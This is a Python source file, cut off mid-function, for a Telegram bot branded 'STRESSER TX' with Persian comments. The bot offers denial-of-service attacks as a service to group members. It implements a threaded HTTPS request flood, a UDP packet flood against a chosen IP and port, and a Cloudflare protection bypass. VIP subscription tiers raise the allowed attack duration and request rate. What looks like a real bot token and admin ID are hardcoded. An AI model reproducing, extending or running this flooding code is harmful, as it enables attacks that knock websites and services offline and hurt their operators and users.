import telebot
import threading
import socket
import requests
import time
import random
from colorama import init, Fore
import urllib.parse
import json
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import asyncio
import aiohttp
import os
from datetime import datetime, timedelta
import ssl
import string
from urllib.parse import urlparse
import cfscrape  # پکیج برای بای‌پس Cloudflare

init()

# توکن ربات
TOKEN = "8469404280:AAExf4TRk_hPU_WmUwN1qUdD94mJv_LtYug"  # توکن ربات
bot = telebot.TeleBot(TOKEN)

# آیدی ادمین (خودت)
ADMIN_ID = "6970586648"  # آیدی عددی ادمین

# لینک گروه برای هدایت کاربران
GROUP_LINK = "https://t.me/+Dzray-5fpA9jMDU0"

# بارگذاری لیست کاربران بن‌شده، VIP، بلاک‌شده‌ها، و سکوت‌ها از فایل
BANNED_FILE = "banned_users.json"
VIP_FILE = "vip_users.json"
BLOCKED_URLS_FILE = "blocked_urls.json"
MUTE_FILE = "muted_users.json"
if os.path.exists(BANNED_FILE):
    with open(BANNED_FILE, 'r') as f:
        banned_users = set(json.load(f))
else:
    banned_users = set()

if os.path.exists(VIP_FILE):
    with open(VIP_FILE, 'r') as f:
        vip_users = json.load(f)
else:
    vip_users = {}

if os.path.exists(BLOCKED_URLS_FILE):
    with open(BLOCKED_URLS_FILE, 'r') as f:
        blocked_urls = set(json.load(f))
else:
    blocked_urls = set()

if os.path.exists(MUTE_FILE):
    with open(MUTE_FILE, 'r') as f:
        muted_users = json.load(f)
else:
    muted_users = {}

# دیکشنری برای Cool Down کاربران
COOLDOWN_FILE = "cooldowns.json"
if os.path.exists(COOLDOWN_FILE):
    with open(COOLDOWN_FILE, 'r') as f:
        cooldowns = json.load(f)
else:
    cooldowns = {}

# ذخیره‌سازی فایل‌ها
def save_banned_users():
    with open(BANNED_FILE, 'w') as f:
        json.dump(list(banned_users), f)

def save_vip_users():
    with open(VIP_FILE, 'w') as f:
        json.dump(vip_users, f)

def save_blocked_urls():
    with open(BLOCKED_URLS_FILE, 'w') as f:
        json.dump(list(blocked_urls), f)

def save_muted_users():
    with open(MUTE_FILE, 'w') as f:
        json.dump(muted_users, f)

def save_cooldowns():
    with open(COOLDOWN_FILE, 'w') as f:
        json.dump(cooldowns, f)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
]

user_data = {}
attack_threads = {}
is_attacking = False  # متغیر برای چک کردن اتک در حال اجرا

# تابع برای چک کردن عضویت یا ادمین بودن آیدی ادمین در گروه
def is_admin_or_member(chat_id):
    try:
        chat_member = bot.get_chat_member(chat_id, int(ADMIN_ID))
        if chat_member.status in ['creator', 'administrator', 'member']:
            return True
        else:
            return False
    except Exception as e:
        print(f"Debug: Error checking admin/member status - {str(e)}")
        return False

def detect_protection(headers):
    if 'cf-ray' in headers or 'cloudflare' in headers.get('server', '').lower():
        return "Cloudflare"
    elif 'ddos-guard' in headers.get('server', '').lower():
        return "DDoS-Guard"
    elif 'sucuri' in headers.get('server', '').lower():
        return "Sucuri"
    else:
        return "Unknown"

def check_status(target):
    try:
        start_time = time.time()
        response = requests.get(target, timeout=5)
        elapsed = (time.time() - start_time) * 1000
        return f"🟢 Active - {elapsed:.2f}ms" if response.status_code == 200 else f"🟡 Unstable - Code: {response.status_code}"
    except:
        return "🔴 Down"

# بهینه‌سازی Rapid_sender
def get_target(parsed_url):
    return parsed_url.path or '/', parsed_url.netloc, parsed_url.port or ("443" if parsed_url.scheme == "https" else "80")

def Rapid_sender(s, byt):
    buffer = b''.join(byt * 500)  # ترکیب 500 درخواست برای ارسال دسته‌ای
    try:
        s.sendall(buffer)  # ارسال یکجا به جای حلقه
    except Exception as e:
        print(f"Rapid_sender error: {e}")

def Rapid(target, meth, stop_event):
    while not stop_event.is_set():
        try:
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
            conn = ssl_context.wrap_socket(socket.create_connection((target[1], int(target[2]))), server_hostname=target[1])
            byt = [f"{meth} {a} HTTP/1.1\nHost: {target[1]}\nConnection: Keep-Alive\n\n\r\r".encode() for a in ['/' + "".join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=1)), target[0]]]
            [threading.Thread(target=Rapid_sender, args=(conn, byt)).start() for _ in range(500)]
            conn.close()
        except Exception as e:
            print(f"Rapid error: {e}")
            break

def layer7_attack(target, duration, rps, stop_event):
    parsed_url = urlparse(target)
    target_info = get_target(parsed_url)
    meth = "GET"
    threads_per_cycle = max(1, rps // 50)  # تعداد تردها بر اساس rps
    [threading.Thread(target=Rapid, args=(target_info, meth, stop_event)).start() for _ in range(threads_per_cycle)]
    time.sleep(duration)
    stop_event.set()

# متد UDP قدرتمند با IP
def layer4_attack(target_ip, port, duration, rps, stop_event):
    stop_time = time.time() + duration
    packet = random._urandom(4084)  # پاکت بزرگ‌تر

    def send_packet():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setblocking(False)
        packets_sent = 0
        while time.time() < stop_time and not stop_event.is_set():
            try:
                for _ in range(rps):  # ارسال بر اساس rps
                    s.sendto(packet, (target_ip, port))
                    packets_sent += 1
            except: pass
        s.close()
        print(f"Sent {packets_sent} packets")

    threads = [threading.Thread(target=send_packet) for _ in range(min(100, rps // 10))]  # حداکثر 100 ترد
    for t in threads: t.start()
    for t in threads: t.join()

# بهینه‌سازی bypass_cloudflare_uam با cfscrape
async def bypass_cloudflare_uam(target, stop_event):
    try:
        scraper = cfscrape.create_scraper()
        response = scraper.get(target, timeout=10)
        if response.status_code == 200:
            return True, "🟢 UAM Bypassed Successfully with cfscrape"
        return False, "🔴 Failed to Bypass UAM"
    except Exception as e:
        return False, f"🔴 Error: {str(e)}"

def update_status(chat_id, message_id, target, target_ip, layer, method, duration, rps, protection, stop_event):
    remaining_time = duration
    while remaining_time > 0 and not stop_event.is_set():
        status = check_status(target) if layer == "L7" else "🟡 UDP - No ping"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Stop Attack", callback_data="stop_attack"))
        bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                              text=f"🚀 Attack Running\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nDuration: {remaining_time}s\nRPS: {rps}\nProtection: {protection}\nStatus: {status}", reply_markup=markup)
        time.sleep(3)
        remaining_time -= 3
    return remaining_time <= 0

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    print(f"Debug: Received /start from user {user_id} in chat {chat_id} (type: {message.chat.type})")

    if user_id != ADMIN_ID and user_id in cooldowns and time.time() < cooldowns[user_id]:
        remaining = int(cooldowns[user_id] - time.time())
        bot.reply_to(message, f"⏳ Cool Down {remaining}s")
        return

    if is_attacking and message.chat.type in ['group', 'supergroup']:
        bot.reply_to(message, "🚫 ربات مشغول به اتک است لطفاً صبر کنید!")
        return

    if user_id != ADMIN_ID and message.chat.type == 'private':
        bot.reply_to(message, "🚫 برای استفاده از STRESSER TX باید به این گروه بری: " + GROUP_LINK)
        return
    
    if user_id == ADMIN_ID and message.chat.type == 'private':
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Layer 7", callback_data="L7"),
                   InlineKeyboardButton("Layer 4", callback_data="L4"))
        bot.send_message(message.chat.id, "🔥 Welcome to DDoS API Bot\nSelect attack layer:", reply_markup=markup)
        return
    
    if message.chat.type in ['group', 'supergroup']:
        if not is_admin_or_member(chat_id):
            bot.reply_to(message, "🚫 برای استفاده از STRESSER TX باید به این گروه بری: " + GROUP_LINK)
            bot.leave_chat(chat_id)
            return
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Layer 7", callback_data="L7"),
                   InlineKeyboardButton("Layer 4", callback_data="L4"))
        bot.send_message(chat_id, "🔥 Welcome to DDoS API Bot\nSelect attack layer:", reply_markup=markup)

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    if len(message.text.split()) < 2:
        bot.reply_to(message, "🚫 لطفاً آیدی کاربر را وارد کنید!\nمثال: `/ban 123456789`")
        return
    user_id = message.text.split()[1]
    banned_users.add(user_id)
    save_banned_users()
    bot.reply_to(message, f"✅ کاربر با آیدی `{user_id}` با موفقیت بن شد (دائمی)!")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    if len(message.text.split()) < 2:
        bot.reply_to(message, "🚫 لطفاً آیدی کاربر را وارد کنید!\nمثال: `/unban 123456789`")
        return
    user_id = message.text.split()[1]
    if user_id in banned_users:
        banned_users.remove(user_id)
        save_banned_users()
        bot.reply_to(message, f"✅ کاربر با آیدی `{user_id}` با موفقیت آن‌بان شد!")
    else:
        bot.reply_to(message, f"❌ کاربر با آیدی `{user_id}` بن نشده بود!")

@bot.message_handler(commands=['vip'])
def set_vip(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) != 5:
        bot.reply_to(message, "🚫 فرمت درست: `/vip <user_id> <days> <max_time> <max_rps>`\nمثال: `/vip 123456789 14 260 3300`")
        return
    user_id, days, max_time, max_rps = args[1], int(args[2]), int(args[3]), int(args[4])
    expiration = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    vip_users[user_id] = {"expiration": expiration, "max_time": max_time, "max_rps": max_rps}
    save_vip_users()
    bot.reply_to(message, f"✅ کاربر با آیدی `{user_id}` به سطح VIP ارتقا یافت!\nمدت: {days} روز\nحداکثر زمان: {max_time}s\nحداکثر RPS: {max_rps}\nانقضا: {expiration}")

@bot.message_handler(commands=['unvip'])
def remove_vip(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    if len(message.text.split()) < 2:
        bot.reply_to(message, "🚫 لطفاً آیدی کاربر را وارد کنید!\nمثال: `/unvip 123456789`")
        return
    user_id = message.text.split()[1]
    if user_id in vip_users:
        del vip_users[user_id]
        save_vip_users()
        bot.reply_to(message, f"✅ اشتراک VIP کاربر با آیدی `{user_id}` حذف شد و به سطح رایگان بازگشت!")
    else:
        bot.reply_to(message, f"❌ کاربر با آیدی `{user_id}` VIP نیست!")

@bot.message_handler(commands=['block'])
def block_url(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "🚫 فرمت درست: `/block <url>`\nمثال: `/block https://example.com`")
        return
    url = args[1]
    blocked_urls.add(url)
    save_blocked_urls()
    bot.reply_to(message, f"✅ لینک `{url}` با موفقیت بلاک شد!")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    user_id = str(call.from_user.id)
    if user_id in banned_users:
        bot.answer_callback_query(call.id, "🚫 شما بن شده‌اید و نمی‌توانید از ربات استفاده کنید!")
        return
    if call.message.chat.type in ['group', 'supergroup'] and not is_admin_or_member(chat_id):
        bot.answer_callback_query(call.id, "🚫 برای استفاده از STRESSER TX باید به این گروه بری: " + GROUP_LINK)
        return
    if call.data in ["L7", "L4"]:
        user_data[chat_id] = {"layer": call.data, "step": "awaiting_method"}
        markup = InlineKeyboardMarkup()
        if call.data == "L7":
            markup.add(InlineKeyboardButton("HTTPS", callback_data="HTTPS"),
                       InlineKeyboardButton("BYPASS_UAM", callback_data="BYPASS_UAM"))
        else:
            markup.add(InlineKeyboardButton("UDP", callback_data="UDP"))
        markup.add(InlineKeyboardButton("Back", callback_data="back_to_start"))
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                              text=f"✅ Layer {call.data} selected\nSelect attack method:", reply_markup=markup)
    elif call.data == "back_to_start":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Layer 7", callback_data="L7"),
                   InlineKeyboardButton("Layer 4", callback_data="L4"))
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                              text="🔥 Welcome to DDoS API Bot\nSelect attack layer:", reply_markup=markup)
        if chat_id in user_data:
            del user_data[chat_id]
    elif call.data in ["HTTPS", "UDP", "BYPASS_UAM"]:
        user_data[chat_id]["method"] = call.data
        user_data[chat_id]["step"] = "awaiting_host"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Back", callback_data="back_to_start"))
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                              text="✅ Method selected\nEnter target host (e.g., https://example.com):", reply_markup=markup)
    elif call.data == "stop_attack":
        stop_attack(chat_id, call.message.message_id)

@bot.message_handler(func=lambda message: True)
def handle_steps(message):
    chat_id = message.chat.id
    user_id = str(message.from_user.id)
    if user_id in banned_users:
        bot.reply_to(message, "🚫 شما بن شده‌اید و نمی‌توانید از ربات استفاده کنید!")
        return
    if chat_id not in user_data or "step" not in user_data[chat_id]:
        return
    if message.chat.type in ['group', 'supergroup'] and not is_admin_or_member(chat_id):
        bot.reply_to(message, "🚫 برای استفاده از STRESSER TX باید به این گروه بری: " + GROUP_LINK)
        return

    step = user_data[chat_id]["step"]
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Back", callback_data="back_to_start"))

    if step == "awaiting_host":
        target = message.text
        targets_to_check = [target, urllib.parse.urlparse(target).netloc] if '://' in target else [target]
        if any(t in blocked_urls for t in targets_to_check):
            bot.reply_to(message, "🚫 لینک در لیست بلاک قرار گرفته!")
            return
        if not target.startswith("http") and user_data[chat_id]["layer"] == "L7":
            target = "http://" + target
        user_data[chat_id]["host"] = target
        user_data[chat_id]["step"] = "awaiting_duration"
        bot.reply_to(message, "⏳ Enter attack duration (seconds):", reply_markup=markup)

    elif step == "awaiting_duration":
        try:
            duration = int(message.text)
            if user_id != ADMIN_ID and user_id not in vip_users and message.chat.type in ['group', 'supergroup']:
                if duration > 60:
                    duration = 60
                    bot.reply_to(message, "⚠️ حداکثر زمان مجاز برای کاربران عادی 60 ثانیه است! زمان به 60 تنظیم شد.")
            elif user_id in vip_users and message.chat.type in ['group', 'supergroup']:
                if datetime.now() > datetime.strptime(vip_users[user_id]["expiration"], "%Y-%m-%d %H:%M:%S"):
                    del vip_users[user_id]
                    save_vip_users()
                    if duration > 60:
                        duration = 60
                        bot.reply_to(message, "⚠️ اشتراک VIP شما منقضی شده است! حداکثر زمان به 60 ثانیه تنظیم شد.")
                else:
                    if duration > vip_users[user_id]["max_time"]:
                        duration = vip_users[user_id]["max_time"]
                        bot.reply_to(message, f"⚠️ حداکثر زمان مجاز برای VIP {vip_users[user_id]['max_time']} ثانیه است! زمان به {duration} تنظیم شد.")
            user_data[chat_id]["duration"] = duration
            user_data[chat_id]["step"] = "awaiting_rps"
            bot.reply_to(message, f"⏱ Duration set to {duration}s\nEnter requests per second (RPS, max 2970 or VIP limit):", reply_markup=markup)
        except ValueError:
            bot.reply_to(message, "❌ Invalid duration! Enter a number:", reply_markup=markup)

    elif step == "awaiting_rps":
        try:
            rps = int(message.text)
            if user_id != ADMIN_ID and user_id not in vip_users and message.chat.type in ['group', 'supergroup']:
                if rps > 2970:
                    rps = 2970
                    bot.reply_to(message, "⚠️ حداکثر RPS مجاز برای کاربران عادی 2970 است! RPS به 2970 تنظیم شد.")
            elif user_id in vip_users and message.chat.type in ['group', 'supergroup']:
                if datetime.now() > datetime.strptime(vip_users[user_id]["expiration"], "%Y-%m-%d %H:%M:%S"):
                    del vip_users[user_id]
                    save_vip_users()
                    if rps > 2970:
                        rps = 2970
                        bot.reply_to(message, "⚠️ اشتراک VIP شما منقضی شده است! حداکثر RPS به 2970 تنظیم شد.")
                else:
                    if rps > vip_users[user_id]["max_rps"]:
                        rps = vip_users[user_id]["max_rps"]
                        bot.reply_to(message, f"⚠️ حداکثر RPS مجاز برای VIP {vip_users[user_id]['max_rps']} است! RPS به {rps} تنظیم شد.")
            if 1 <= rps:
                user_data[chat_id]["rps"] = rps
                if user_data[chat_id]["layer"] == "L4":
                    user_data[chat_id]["step"] = "awaiting_port"
                    bot.reply_to(message, "🔌 Enter port (1-65535):", reply_markup=markup)
                else:
                    start_attack(chat_id, user_id)
            else:
                raise ValueError
        except ValueError:
            bot.reply_to(message, "❌ Invalid RPS! Enter a number between 1-2970 (یا بیشتر برای VIP/ادمین):", reply_markup=markup)

    elif step == "awaiting_port":
        try:
            port = int(message.text)
            if 1 <= port <= 65535:
                user_data[chat_id]["port"] = port
                start_attack(chat_id, user_id)
            else:
                raise ValueError
        except ValueError:
            bot.reply_to(message, "❌ Invalid port! Enter a number between 1-65535:", reply_markup=markup)

def start_attack(chat_id, user_id):
    global is_attacking
    user_id = str(user_id)
    if user_id in banned_users:
        bot.send_message(chat_id, "🚫 شما بن شده‌اید و نمی‌توانید از ربات استفاده کنید!")
        return
    if chat_id not in user_data:
        return

    is_attacking = True

    target = user_data[chat_id]["host"]
    duration = user_data[chat_id]["duration"]
    rps = user_data[chat_id]["rps"]
    method = user_data[chat_id]["method"]
    layer = user_data[chat_id]["layer"]

    stop_event = threading.Event()
    attack_threads[chat_id] = stop_event

    if layer == "L7":
        parsed_url = urllib.parse.urlparse(target)
        host = parsed_url.hostname
        target_ip = socket.gethostbyname(host)
        if method == "BYPASS_UAM":
            attack_func = bypass_cloudflare_uam
            args = (target, stop_event)
            is_async = True
        else:
            attack_func = layer7_attack
            args = (target, duration, rps, stop_event)
            is_async = False
    else:
        target_ip = socket.gethostbyname(ta
